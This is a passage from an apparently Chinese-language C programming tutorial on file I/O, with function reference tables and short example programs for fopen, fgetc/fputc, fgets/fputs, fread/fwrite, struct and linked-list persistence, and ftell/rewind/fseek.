<td style="text-align:center">打开文件</td>
<td style="text-align:center">可以</td>
<td style="text-align:center">可以</td>
</tr>
<tr>
<td style="text-align:center">w+</td>
<td style="text-align:center">写入/读取</td>
<td style="text-align:center">建立新文件</td>
<td style="text-align:center">覆盖原有文件</td>
<td style="text-align:center">可以</td>
<td style="text-align:center">可以</td>
</tr>
<tr>
<td style="text-align:center">a++</td>
<td style="text-align:center">读取/追加</td>
<td style="text-align:center">建立新文件</td>
<td style="text-align:center">在原有文件后追加</td>
<td style="text-align:center">可以</td>
<td style="text-align:center">可以</td>
</tr>
</tbody>
</table>
<blockquote>
<p>注意点:</p>
<ul>
<li>Windows如果读写的是二进制文件，则还要加 b,比如 rb, r+b 等。 unix/linux 不区分文本和二进制文件</li>
</ul>
</blockquote>
<ul>
<li>fclose函数</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fclose ( FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">fclose()用来关闭先前 fopen()打开的文件.</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">此动作会让缓冲区内的数据写入文件中, 并释放系统所提供的文件资源</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 成功返回 0 ，失败返回 EOF(-1)。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    fclose(fp);
    return 0;
&#125;</code></pre>
<h2 id="一次读写一个字符">一次读写一个字符</h2>
<ul>
<li>写入</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fputc (int ch, FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">将 ch 字符，写入文件。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">int : 需要写入的字符。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 写入成功，返回写入成功字符，如果失败，返回 EOF。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    // 1.打开一个文件
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);

    // 2.往文件中写入内容
    for(char ch = &#x27;a&#x27;; ch &lt;= &#x27;z&#x27;; ch++)&#123;
        // 一次写入一个字符
        char res = fputc(ch, fp);
        printf(&quot;res = %c\n&quot;, res);
    &#125;

    // 3.关闭打开的文件
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>读取</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fgetc ( FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">从文件流中读取一个字符并返回。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 正常，返回读取的字符；读到文件尾或出错时，为 EOF。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    // 1.打开一个文件
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;r+&quot;);

    // 2.从文件中读取内容
    char res = EOF;
    while((res = fgetc(fp)) != EOF)&#123;
        printf(&quot;res = %c\n&quot;, res);
    &#125;

    // 3.关闭打开的文件
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>判断文件末尾
<ul>
<li>feof函数</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int feof( FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">判断文件是否读到文件结尾</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE* stream :指向文件缓冲的指针。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 0 未读到文件结尾，非零 读到文件结尾。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    // 1.打开一个文件
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;r+&quot;);

    // 2.从文件中读取内容
    char res = EOF;
    // 注意: 由于只有先读了才会修改标志位,
    // 所以通过feof判断是否到达文件末尾, 一定要先读再判断, 不能先判断再读
    while((res = fgetc(fp)) &amp;&amp; (!feof(fp)))&#123;
        printf(&quot;res = %c\n&quot;, res);
    &#125;

    // 3.关闭打开的文件
    fclose(fp);
    return 0;
&#125;</code></pre>
<blockquote>
<ul>
<li>注意点:</li>
<li>feof 这个函数，是去读标志位判断文件是否结束的。</li>
<li>而标志位只有读完了才会被修改, 所以如果先判断再读标志位会出现多打一次的的现象</li>
<li>所以企业开发中使用feof函数一定要先读后判断, 而不能先判断后读</li>
</ul>
</blockquote>
<ul>
<li>作业
<ul>
<li>实现文件的简单加密和解密</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void encode(char *name, char *newName, int code);
void decode(char *name, char *newName, int code);
int main()
&#123;
    encode(&quot;main.c&quot;, &quot;encode.c&quot;, 666);
    decode(&quot;encode.c&quot;, &quot;decode.c&quot;, 666);
    return 0;
&#125;
/**
 * @brief encode 加密文件
 * @param name 需要加密的文件名称
 * @param newName 加密之后的文件名称
 * @param code 秘钥
 */
void encode(char *name, char *newName, int code)&#123;
    FILE *fw = fopen(newName, &quot;w+&quot;);
    FILE *fr = fopen(name, &quot;r+&quot;);
    char ch = EOF;
    while((ch = fgetc(fr)) &amp;&amp; (!feof(fr)))&#123;
        fputc(ch ^ code, fw);
    &#125;
    fclose(fw);
    fclose(fr);
&#125;
/**
 * @brief encode 解密文件
 * @param name 需要解密的文件名称
 * @param newName 解密之后的文件名称
 * @param code 秘钥
 */
void decode(char *name, char *newName, int code)&#123;
    FILE *fw = fopen(newName, &quot;w+&quot;);
    FILE *fr = fopen(name, &quot;r+&quot;);
    char ch = EOF;
    while((ch = fgetc(fr)) &amp;&amp; (!feof(fr)))&#123;
        fputc(ch ^ code, fw);
    &#125;
    fclose(fw);
    fclose(fr);
&#125;</code></pre>
<h2 id="一次读写一行字符">一次读写一行字符</h2>
<ul>
<li>
<p>什么是行</p>
</li>
<li>
<p>行是文本编辑器中的概念，文件流中就是一个字符。这个在不同的平台是有差异的。window 平台 ‘\r\n’，linux 平台是’\n’</p>
</li>
<li>
<p>平台差异</p>
<ul>
<li>windows 平台在写入’\n’是会体现为’\r\n’，linux 平台在写入’\n’时会体现为’\n’。windows 平台在读入’\r\n’时，体现为一个字符’\n’，linux 平台在读入’\n’时，体现为一个字符’\n’</li>
<li>linux 读 windows 中的换行，则会多读一个字符，windows 读 linux 中的换行，则没有问题</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fw = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    fputc(&#x27;a&#x27;, fw);
    fputc(&#x27;\n&#x27;, fw);
    fputc(&#x27;b&#x27;, fw);
    fclose(fw);
    return 0;
&#125;</code></pre>
<p>[外链图片转存中…(img-YHwGq2tR-1648814825912)]</p>
<hr>
<ul>
<li>写入一行</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fputs(char *str,FILE *fp)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">把 str 指向的字符串写入 fp 指向的文件中。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char * str : 表示指向的字符串的指针。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE *fp : 指向文件流结构的指针。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 正常，返 0；出错返 EOF。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fw = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs不会自动添加\n
    fputs(&quot;lnj\n&quot;, fw);
    fputs(&quot;it666\n&quot;, fw);
    fclose(fw);
    return 0;
&#125;</code></pre>
<ul>
<li>遇到\0自动终止写入</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs写入时遇到\0就会自动终止写入
    fputs(&quot;lnj\0it666\n&quot;, fp);

    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>读取一行</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">char *fgets(char *str,int length,FILE *fp)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">从 fp 所指向的文件中，至多读 length-1 个字符，送入字符数组 str 中， 如果在读入 length-1 个字符结束前遇\n 或 EOF，读入即结束，字符串读入后在最后加一个‘\0’字符。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char * str :指向需要读入数据的缓冲区。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">int length :每一次读数字符的字数。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">FILE* fp :文件流指针。</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">char * 正常，返 str 指针；出错或遇到文件结尾 返空指针 NULL。</td>
</tr>
</tbody>
</table>
<ul>
<li>最多只能读取N-1个字符</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs不会自动添加\n
    fputs(&quot;it666\n&quot;, fp);

    // 将FILE结构体中的读写指针重新移动到最前面
    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动
    rewind(fp);
    char str[1024];
    // 从fp中读取4个字符, 存入到str中
    // 最多只能读取N-1个字符, 会在最后自动添加\0
    fgets(str, 4, fp);

    printf(&quot;str = %s&quot;, str); // it6
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>遇到\n自动结束</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs不会自动添加\n
    fputs(&quot;lnj\n&quot;, fp);
    fputs(&quot;it666\n&quot;, fp);

    // 将FILE结构体中的读写指针重新移动到最前面
    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动
    rewind(fp);
    char str[1024];
    // 从fp中读取1024个字符, 存入到str中
    // 但是读到第4个就是\n了, 函数会自动停止读取
    // 注意点: \n会被读取进来
    fgets(str, 1024, fp);

    printf(&quot;str = %s&quot;, str); // lnj
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>读取到EOF自动结束</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs不会自动添加\n
    fputs(&quot;lnj\n&quot;, fp);
    fputs(&quot;it666&quot;, fp);

    // 将FILE结构体中的读写指针重新移动到最前面
    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动
    rewind(fp);
    char str[1024];
    // 每次从fp中读取1024个字符, 存入到str中
    // 读取到文件末尾自动结束
    while(fgets(str, 1024, fp))&#123;
        printf(&quot;str = %s&quot;, str);
    &#125;
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>注意点:
<ul>
<li>企业开发中能不用feof函数就不用feof函数</li>
<li>如果最后一行，没有行‘\n’的话则少读一行</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    // 注意: fputs不会自动添加\n
    fputs(&quot;12345678910\n&quot;, fp);
    fputs(&quot;12345678910\n&quot;, fp);
    fputs(&quot;12345678910&quot;, fp);

    // 将FILE结构体中的读写指针重新移动到最前面
    // 注意: FILE结构体中读写指针每读或写一个字符后都会往后移动
    rewind(fp);
    char str[1024];
    // 每次从fp中读取1024个字符, 存入到str中
    // 读取到文件末尾自动结束
    while(fgets(str, 1024, fp) &amp;&amp; !feof(fp))&#123;
        printf(&quot;str = %s&quot;, str);
    &#125;
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>作业:
<ul>
<li>利用fgets(str, 5, fp)读取下列文本会读取多少次?</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">12345678910
12345
123</code></pre>
<h2 id="一次读写一块数据">一次读写一块数据</h2>
<ul>
<li>
<p>C 语言己经从接口的层面区分了，文本的读写方式和二进制的读写方式。前面我们讲的是文本的读写方式。</p>
</li>
<li>
<p>所有的文件接口函数，要么以 ‘\0’，表示输入结束，要么以 ‘\n’， EOF(0xFF)表示读取结束。 ‘\0’ ‘\n’ 等都是文本文件的重要标识，而所有的二进制接口对于这些标识，是不敏感的。<br>
+二进制的接口可以读文本，而文本的接口不可以读二进制</p>
</li>
<li>
<p>一次写入一块数据</p>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fwrite(void *buffer, int num_bytes, int count, FILE *fp)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">把buffer 指向的数据写入fp 指向的文件中</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char * buffer : 指向要写入数据存储区的首地址的指针</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">int num_bytes: 每个要写的字段的字节数count</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">int count : 要写的字段的个数</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">FILE* fp : 要写的文件指针</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 成功，返回写的字段数；出错或文件结束，返回 0。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;wb+&quot;);
    // 注意: fwrite不会关心写入数据的格式
    char *str = &quot;lnj\0it666&quot;;
     /*
     * 第一个参数: 被写入数据指针
     * 第二个参数: 每次写入多少个字节
     * 第三个参数: 需要写入多少次
     * 第四个参数: 已打开文件结构体指针
     */
    fwrite((void *)str, 9, 1, fp);

    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>一次读取一块数据</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fread(void *buffer, int num_bytes, int count, FILE *fp)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">把fp 指向的文件中的数据读到 buffer 中。</td>
</tr>
<tr>
<td style="text-align:center">参数</td>
<td style="text-align:center">char * buffer : 指向要读入数据存储区的首地址的指针</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">int num_bytes: 每个要读的字段的字节数count</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">int count : 要读的字段的个数</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">FILE* fp : 要读的文件指针</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 成功，返回读的字段数；出错或文件结束，返回 0。</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    // test.txt中存放的是&quot;lnj\0it666&quot;
    FILE *fr = fopen(&quot;test.txt&quot;, &quot;rb+&quot;);
    char buf[1024] = &#123;0&#125;;
    // fread函数读取成功返回读取到的字节数, 读取失败返回0
    /*
     * 第一个参数: 存储读取到数据的容器
     * 第二个参数: 每次读取多少个字节
     * 第三个参数: 需要读取多少次
     * 第四个参数: 已打开文件结构体指针
     */ 
    int n = fread(buf, 1, 1024, fr);
    printf(&quot;%i\n&quot;, n);
    for(int i = 0; i &lt; n; i++)&#123;
        printf(&quot;%c&quot;, buf[i]);
    &#125;
    fclose(fr);
    return 0;
&#125;</code></pre>
<blockquote>
<ul>
<li>注意点:</li>
<li>读取时num_bytes应该填写读取数据类型的最小单位, 而count可以随意写</li>
<li>如果读取时num_bytes不是读取数据类型最小单位, 会引发读取失败</li>
<li>例如: 存储的是char类型 6C 6E 6A 00 69 74 36 36 36<br>
如果num_bytes等于1, count等于1024, 那么依次取出 6C 6E 6A 00 69 74 36 36 36 , 直到取不到为止<br>
如果num_bytes等于4, count等于1024, 那么依次取出[6C 6E 6A 00][69 74 36 36] , 但是最后还剩下一个36, 但又不满足4个字节, 那么最后一个36则取不到</li>
</ul>
</blockquote>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main()
&#123;

    // test.txt中存放的是&quot;lnj\0it666&quot;
    FILE *fr = fopen(&quot;test.txt&quot;, &quot;rb+&quot;);
    char buf[1024] = &#123;0&#125;;
    /*
    while(fread(buf, 4, 1, fr) &gt; 0)&#123;
        printf(&quot;%c\n&quot;, buf[0]);
        printf(&quot;%c\n&quot;, buf[1]);
        printf(&quot;%c\n&quot;, buf[2]);
        printf(&quot;%c\n&quot;, buf[3]);
    &#125;
    */
    /*
    while(fread(buf, 1, 4, fr) &gt; 0)&#123;
        printf(&quot;%c\n&quot;, buf[0]);
        printf(&quot;%c\n&quot;, buf[1]);
        printf(&quot;%c\n&quot;, buf[2]);
        printf(&quot;%c\n&quot;, buf[3]);
    &#125;
    */
    while(fread(buf, 1, 1, fr) &gt; 0)&#123;
        printf(&quot;%c\n&quot;, buf[0]);
    &#125;
    fclose(fr);
    return 0;
&#125;</code></pre>
<blockquote>
<ul>
<li>注意: fwrite和fread本质是用来操作二进制的</li>
<li>所以下面用法才是它们的正确打开方法</li>
</ul>
</blockquote>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;

    FILE *fp = fopen(&quot;test.txt&quot;, &quot;wb+&quot;);
    int ages[4] = &#123;1, 3, 5, 6&#125;;
    fwrite(ages, sizeof(ages), 1, fp);
    rewind(fp);
    int data;
    while(fread(&amp;data, sizeof(int), 1, fp) &gt; 0)&#123;
        printf(&quot;data = %i\n&quot;, data);
    &#125;
    return 0;
&#125;</code></pre>
<h2 id="读写结构体">读写结构体</h2>
<ul>
<li>结构体中的数据类型不统一，此时最适合用二进制的方式进行读写</li>
<li>读写单个结构体</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

typedef struct&#123;
    char *name;
    int age;
    double height;
&#125; Person;

int main()
&#123;
    Person p1 = &#123;&quot;lnj&quot;, 35, 1.88&#125;;
//    printf(&quot;name = %s\n&quot;, p1.name);
//    printf(&quot;age = %i\n&quot;, p1.age);
//    printf(&quot;height = %lf\n&quot;, p1.height);

    FILE *fp = fopen(&quot;person.stu&quot;, &quot;wb+&quot;);
    fwrite(&amp;p1, sizeof(p1), 1, fp);

    rewind(fp);
    Person p2;
    fread(&amp;p2, sizeof(p2), 1, fp);
    printf(&quot;name = %s\n&quot;, p2.name);
    printf(&quot;age = %i\n&quot;, p2.age);
    printf(&quot;height = %lf\n&quot;, p2.height);

    return 0;
&#125;</code></pre>
<ul>
<li>读写结构体数组</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

typedef struct&#123;
    char *name;
    int age;
    double height;
&#125; Person;

int main()
&#123;
    Person ps[] = &#123;
      &#123;&quot;zs&quot;, 18, 1.65&#125;,
      &#123;&quot;ls&quot;, 21, 1.88&#125;,
      &#123;&quot;ww&quot;, 33, 1.9&#125;
    &#125;;


    FILE *fp = fopen(&quot;person.stu&quot;, &quot;wb+&quot;);
    fwrite(&amp;ps, sizeof(ps), 1, fp);

    rewind(fp);
    Person p;
    while(fread(&amp;p, sizeof(p), 1, fp) &gt; 0)&#123;
        printf(&quot;name = %s\n&quot;, p.name);
        printf(&quot;age = %i\n&quot;, p.age);
        printf(&quot;height = %lf\n&quot;, p.height);
    &#125;
    return 0;
&#125;</code></pre>
<ul>
<li>读写结构体链表</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

typedef struct person&#123;
    char *name;
    int age;
    double height;
    struct person* next;
&#125; Person;
Person *createEmpty();
void  insertNode(Person *head, char *name, int age, double height);
void printfList(Person *head);
int saveList(Person *head, char *name);
Person *loadList(char *name);

int main()
&#123;

//    Person *head = createEmpty();
//    insertNode(head, &quot;zs&quot;, 18, 1.9);
//    insertNode(head, &quot;ls&quot;, 22, 1.65);
//    insertNode(head, &quot;ws&quot;, 31, 1.78);
//    printfList(head);
//    saveList(head, &quot;person.list&quot;);
    Person *head = loadList(&quot;person.list&quot;);
    printfList(head);
    return 0;
&#125;

/**
 * @brief loadList 从文件加载链表
 * @param name 文件名称
 * @return  加载好的链表头指针
 */
Person *loadList(char *name)&#123;
    // 1.打开文件
    FILE *fp = fopen(name, &quot;rb+&quot;);
    if(fp == NULL)&#123;
        return NULL;
    &#125;
    // 2.创建一个空链表
    Person *head = createEmpty();
    // 3.创建一个节点
    Person *node = (Person *)malloc(sizeof(Person));
    while(fread(node, sizeof(Person), 1, fp) &gt; 0)&#123;
        // 3.进行插入
        // 3.1让新节点的下一个节点 等于 头节点的下一个节点
        node-&gt;next = head-&gt;next;
        // 3.2让头结点的下一个节点 等于 新节点
        head-&gt;next = node;

        // 给下一个节点申请空间
        node = (Person *)malloc(sizeof(Person));
    &#125;
    // 释放多余的节点空间
    free(node);
    fclose(fp);
    return head;
&#125;

/**
 * @brief saveList 存储链表到文件
 * @param head 链表头指针
 * @param name 存储的文件名称
 * @return  是否存储成功 -1失败 0成功
 */
int saveList(Person *head, char *name)&#123;
    // 1.打开文件
    FILE *fp = fopen(name, &quot;wb+&quot;);
    if(fp == NULL)&#123;
        return -1;
    &#125;
    // 2.取出头节点的下一个节点
    Person *cur = head-&gt;next;
    // 3.将所有有效节点保存到文件中
    while(cur != NULL)&#123;
        fwrite(cur, sizeof(Person), 1, fp);
        cur = cur-&gt;next;
    &#125;
    fclose(fp);
    return 0;
&#125;
/**
 * @brief printfList 遍历链表
 * @param head 链表的头指针
 */
void printfList(Person *head)&#123;
    // 1.取出头节点的下一个节点
    Person *cur = head-&gt;next;
    // 2.判断是否为NULL, 如果不为NULL就开始遍历
    while(cur != NULL)&#123;
        // 2.1取出当前节点的数据, 打印
        printf(&quot;name = %s\n&quot;, cur-&gt;name);
        printf(&quot;age = %i\n&quot;, cur-&gt;age);
        printf(&quot;height = %lf\n&quot;, cur-&gt;height);
        printf(&quot;next = %x\n&quot;, cur-&gt;next);
        printf(&quot;-----------\n&quot;);
        // 2.2让当前节点往后移动
        cur = cur-&gt;next;
    &#125;
&#125;

/**
 * @brief insertNode 插入新的节点
 * @param head 链表的头指针
 * @param p 需要插入的结构体
 */
void  insertNode(Person *head, char *name, int age, double height)&#123;
    // 1.创建一个新的节点
    Person *node = (Person *)malloc(sizeof(Person));
    // 2.将数据保存到新节点中
    node-&gt;name = name;
    node-&gt;age = age;
    node-&gt;height = height;

    // 3.进行插入
    // 3.1让新节点的下一个节点 等于 头节点的下一个节点
    node-&gt;next = head-&gt;next;
    // 3.2让头结点的下一个节点 等于 新节点
    head-&gt;next = node;
&#125;
/**
 * @brief createEmpty 创建一个空链表
 * @return 链表头指针, 创建失败返回NULL
 */
Person *createEmpty()&#123;
    // 1.定义头指针
    Person *head = NULL;
    // 2.创建一个空节点, 并且赋值给头指针
    head = (Person *)malloc(sizeof(Person));
    if(head == NULL)&#123;
        return head;
    &#125;
    head-&gt;next = NULL;
    // 3.返回头指针
    return head;
&#125;</code></pre>
<h2 id="其它文件操作函数">其它文件操作函数</h2>
<ul>
<li>ftell 函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数声明</th>
<th>long ftell ( FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td>所在文件</td>
<td>stdio.h</td>
</tr>
<tr>
<td>函数功能</td>
<td>得到流式文件的当前读写位置,其返回值是当前读写位置偏离文件头部的字节数.</td>
</tr>
<tr>
<td>参数及返回解析</td>
<td></td>
</tr>
<tr>
<td>参数</td>
<td>FILE * 流文件句柄</td>
</tr>
<tr>
<td>返回值</td>
<td>int 成功，返回当前读写位置偏离文件头部的字节数。失败， 返回-1</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    char *str = &quot;123456789&quot;;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    long cp = ftell(fp);
    printf(&quot;cp = %li\n&quot;, cp); // 0
    // 写入一个字节
    fputc(str[0], fp);
    cp = ftell(fp);
    printf(&quot;cp = %li\n&quot;, cp); // 1
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>rewind 函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数声明</th>
<th>void rewind ( FILE * stream );</th>
</tr>
</thead>
<tbody>
<tr>
<td>所在文件</td>
<td>stdio.h</td>
</tr>
<tr>
<td>函数功能 将文件指针重新指向一个流的开头。</td>
<td></td>
</tr>
<tr>
<td>参数及返回解析</td>
<td></td>
</tr>
<tr>
<td>参数</td>
<td>FILE * 流文件句柄</td>
</tr>
<tr>
<td>返回值</td>
<td>void 无返回值</td>
</tr>
</tbody>
</table>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    char *str = &quot;123456789&quot;;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    long cp = ftell(fp);
    printf(&quot;cp = %li\n&quot;, cp); // 0
    // 写入一个字节
    fputc(str[0], fp);
    cp = ftell(fp);
    printf(&quot;cp = %li\n&quot;, cp); // 1
    // 新指向一个流的开头
    rewind(fp);
    cp = ftell(fp);
    printf(&quot;cp = %li\n&quot;, cp); // 0
    fclose(fp);
    return 0;
&#125;</code></pre>
<ul>
<li>fseek 函数</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">函数声明</th>
<th style="text-align:center">int fseek ( FILE * stream, long offset, int where);</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">所在文件</td>
<td style="text-align:center">stdio.h</td>
</tr>
<tr>
<td style="text-align:center">函数功能</td>
<td style="text-align:center">偏移文件指针。</td>
</tr>
<tr>
<td style="text-align:center">参数及返回解析</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">参 数</td>
<td style="text-align:center">FILE * stream 文件句柄</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">long offset 偏移量</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center">int where 偏移起始位置</td>
</tr>
<tr>
<td style="text-align:center">返回值</td>
<td style="text-align:center">int 成功返回 0 ，失败返回-1</td>
</tr>
</tbody>
</table>
<ul>
<li>常用宏</li>
</ul>
<pre><code class="hljs plaintext">#define SEEK_CUR 1 当前文字
#define SEEK_END 2 文件结尾
#define SEEK_SET 0 文件开头</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);
    fputs(&quot;123456789&quot;, fp);
    // 将文件指针移动到文件结尾, 并且偏移0个单位
    fseek(fp, 0, SEEK_END);
    int len = ftell(fp); // 计算文件长度
    printf(&quot;len = %i\n&quot;, len);
    fclose(fp);
    return 0;
&#125;</code></pre>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

int main()
&#123;
    FILE *fp;
   fp = fopen(&quot;file.txt&quot;,&quot;w+&quot;);
